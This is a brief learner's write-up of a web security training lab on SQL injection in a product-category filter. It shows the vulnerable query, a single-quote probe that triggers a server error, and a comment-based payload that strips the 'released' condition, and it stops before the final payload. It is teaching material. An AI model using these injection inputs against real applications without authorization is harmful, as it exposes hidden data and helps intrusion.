# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- lab contains a SQL injection vulnerability in the product category
- When the user selects a category, the application carries out a SQL query like the following
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
- Goal : display one or more unreleased products 
# Solving the lab 
- the url of the lab is like this
```
https://0aa100aa03460e178277bf9200a400f4.web-security-academy.net/filter?category=Lifestyle
```
- first thing to try is to break the webapp so lets try this
```
https://0aa100aa03460e178277bf9200a400f4.web-security-academy.net/filter?category=' 
```
- and we got internal server error and breacked the app
- the sql query became like this 
```
SELECT * FROM products WHERE category = ''' AND released = 1
```
- now we need to make the rest of the query commencted like this
```
SELECT * FROM products WHERE category = ''--' AND released = 1
```
- and the server will read the query like this 
```
SELECT * FROM products WHERE category = ''
```
